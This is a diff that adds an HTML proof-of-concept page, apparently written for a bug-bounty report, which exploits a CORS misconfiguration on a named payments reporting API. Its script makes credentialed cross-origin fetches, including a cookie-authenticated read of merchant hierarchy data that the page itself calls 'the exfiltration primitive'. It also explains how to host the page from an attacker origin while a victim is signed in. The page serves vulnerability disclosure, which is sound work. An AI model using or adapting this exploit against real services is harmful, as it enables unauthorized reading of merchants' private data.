@@ -1,0 +1,167 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CORS credentialed-read PoC — HackerOne #4212636</title>
+<style>
+  :root { color-scheme: light dark; }
+  body { font: 15px/1.55 ui-sans-serif, system-ui, -apple-system, "Segoe UI", sans-serif; margin: 0; padding: 28px; max-width: 980px; }
+  h1 { font-size: 1.3rem; margin: 0 0 4px; }
+  h2 { font-size: 1rem; margin: 22px 0 8px; }
+  .sub { opacity: .72; margin: 0 0 18px; font-size: .88rem; }
+  .box { border: 1px solid rgba(128,128,128,.35); border-radius: 10px; padding: 14px 16px; margin: 0 0 16px; }
+  .warn { border-color: rgba(220,140,0,.6); background: rgba(220,140,0,.09); }
+  .badbox { border-color: rgba(200,40,40,.5); background: rgba(200,40,40,.07); }
+  .goodbox { border-color: rgba(30,140,60,.5); background: rgba(30,140,60,.07); }
+  code, pre { font-family: ui-monospace, SFMono-Regular, Consolas, monospace; }
+  pre { overflow: auto; padding: 12px; border-radius: 8px; background: rgba(128,128,128,.12); font-size: 12.5px; line-height: 1.5; }
+  table { border-collapse: collapse; width: 100%; font-size: 13px; }
+  th, td { text-align: left; padding: 7px 8px; border-bottom: 1px solid rgba(128,128,128,.28); vertical-align: top; }
+  button { font: inherit; padding: 8px 16px; border-radius: 8px; border: 1px solid rgba(128,128,128,.5); background: transparent; cursor: pointer; }
+  button:hover { background: rgba(128,128,128,.12); }
+  .ok { color: #1a7f37; font-weight: 600; }
+  .bad { color: #b42318; font-weight: 600; }
+  .unk { color: #8a5a00; font-weight: 600; }
+  ol, ul { padding-left: 1.3em; }
+</style>
+</head>
+<body>
+
+<h1>CORS with credentials — live PoC</h1>
+<p class="sub">
+  Target <code id="api"></code><br>
+  This page's origin <code id="origin"></code>
+</p>
+
+<div class="box warn">
+  <strong>Two preconditions, or this page proves nothing.</strong>
+  <ol>
+    <li><strong>Open it over http(s), not <code>file://</code>.</strong> A file page has the opaque origin
+      <code>null</code>, which is not equivalent to a real attacker origin and is rejected by at least one
+      endpoint here. Serve the file from any origin you control.</li>
+    <li><strong>Sign in to the Merchant Portal in this same browser first.</strong> Without a session cookie
+      for the API host, every call is an unauthenticated <code>401</code> and there is no data to steal.</li>
+  </ol>
+</div>
+
+<div class="box">
+  <strong>Why this page does not print <code>Access-Control-Allow-Origin</code>.</strong>
+  Browsers only expose CORS-safelisted response headers to JavaScript; the <code>Access-Control-*</code>
+  headers are not on that list, so <code>response.headers.get('access-control-allow-origin')</code> is always
+  <code>null</code> here even when the header is present. The proof is therefore behavioral: if the browser
+  hands the body to this page, the origin was reflected and credentials were allowed — otherwise the
+  fetch would have thrown. Read the echoed headers in DevTools → Network → Response Headers.
+</div>
+
+<p><button id="run" type="button">Run</button></p>
+<table id="results">
+  <thead><tr><th style="width:23%">Step</th><th style="width:20%">Result</th><th>Meaning</th></tr></thead>
+  <tbody></tbody>
+</table>
+<pre id="log" hidden></pre>
+
+<div class="box badbox" id="verdict" hidden></div>
+
+<h2>What each step decides</h2>
+<ul>
+  <li><strong>1 — credentialed GET <code>/reporting</code>:</strong> readable body proves
+    <code>Access-Control-Allow-Origin</code> was reflected for this origin together with
+    <code>Access-Control-Allow-Credentials: true</code>. Without both, the browser throws.</li>
+  <li><strong>2 — preflighted POST with <code>Authorization</code> + <code>apikey</code>:</strong> a resolved
+    response proves the preflight approves non-simple methods and sensitive request headers for this origin.</li>
+  <li><strong>3 — credentialed GET on the legacy hierarchy endpoint:</strong> this is the only step that
+    demonstrates data exfiltration. It needs a live portal session.</li>
+</ul>
+
+<script>
+(function () {
+  'use strict';
+  var API = 'https://secure-api-qa.np-reporting.globalpay.com';
+  var HIER = '/nextgen/hierarchy/api/v1/search/mids?hierarchyId=a181a603769c1f98ad927e7367c7aa51&searchValue=&pageSize=1';
+
+  document.getElementById('api').textContent = API;
+  document.getElementById('origin').textContent = location.origin || '(opaque)';
+
+  var tbody = document.querySelector('#results tbody');
+  var logEl = document.getElementById('log');
+  var verdict = document.getElementById('verdict');
+
+  function row(step, verdictText, cls, meaning) {
+    var tr = document.createElement('tr');
+    tr.innerHTML = '<td></td><td class="' + cls + '"></td><td></td>';
+    tr.children[0].textContent = step;
+    tr.children[1].textContent = verdictText;
+    tr.children[2].textContent = meaning;
+    tbody.appendChild(tr);
+  }
+
+  function line(s) { logEl.hidden = false; logEl.textContent += s + '\n'; }
+
+  function summary(res, body) {
+    var b = (body || '').replace(/\s+/g, ' ').trim();
+    return b.length > 140 ? b.slice(0, 140) + '…' : b;
+  }
+
+  async function get(label, path, init) {
+    line('--- ' + label + ' -> ' + API + path);
+    try {
+      var r = await fetch(API + path, init);
+      var body = '';
+      try { body = await r.text(); } catch (e) { body = ''; }
+      line('    HTTP ' + r.status + ' (' + r.type + '), body len ' + body.length);
+      line('    body: ' + summary(body));
+      return { ok: true, status: r.status, type: r.type, body: body };
+    } catch (err) {
+      line('    fetch rejected: ' + err);
+      return { ok: false, error: String(err) };
+    }
+  }
+
+  document.getElementById('run').addEventListener('click', async function () {
+    tbody.textContent = '';
+    logEl.textContent = '';
+    verdict.hidden = true;
+
+    var issues = [];
+    if (location.protocol === 'file:') {
+      issues.push('This page is on file:// — its origin is "null", not a real attacker origin. Serve it over http(s) instead.');
+    }
+
+    // Step 1
+    var s1 = await get('1. credentialed GET /reporting', '/reporting', {
+      headers: { Accept: 'application/json' }, credentials: 'include', mode: 'cors'
+    });
+    if (s1.ok) row('1. credentialed GET /reporting', 'READABLE (HTTP ' + s1.status + ')', 'ok',
+      'Origin reflected with credentials allowed — the browser released the body to a foreign origin.');
+    else row('1. credentialed GET /reporting', 'BLOCKED', 'bad',
+      'Fetch threw: the response did not carry a matching Access-Control-Allow-Origin with credentials.');
+
+    // Step 2
+    var s2 = await get('2. preflighted POST /reporting', '/reporting', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer test-token', 'apikey': 'test' },
+      body: '{}', credentials: 'include', mode: 'cors'
+    });
+    if (s2.ok) row('2. preflighted POST + sensitive headers', 'PREFLIGHT APPROVED', 'ok',
+      'The browser completed a non-simple cross-origin request, so the preflight allowed this origin, method and headers.');
+    else row('2. preflighted POST + sensitive headers', 'BLOCKED', 'bad', 'Preflight was refused for this origin.');
+
+    // Step 3
+    var s3 = await get('3. credentialed GET hierarchy (impact)', HIER, { credentials: 'include', mode: 'cors' });
+    if (s3.ok && s3.status >= 200 && s3.status < 300) row('3. cookie-auth read (impact)', 'DATA READABLE', 'ok',
+      'Merchant data crossed origins: this is the exfiltration primitive.');
+    else if (s3.ok) row('3. cookie-auth read (impact)', 'READABLE but HTTP ' + s3.status, 'unk',
+      'Body was readable; check whether the status reflects a session that was actually attached.');
+    else row('3. cookie-auth read (impact)', 'BLOCKED', 'bad',
+      'The endpoint did not grant this origin access, so no cross-origin read is demonstrated here.');
+
+    if (issues.length) {
+      verdict.hidden = false;
+      verdict.textContent = 'Caveat: ' + issues.join(' ');
+    }
+  });
+})();
+</script>
+</body>
+</html>
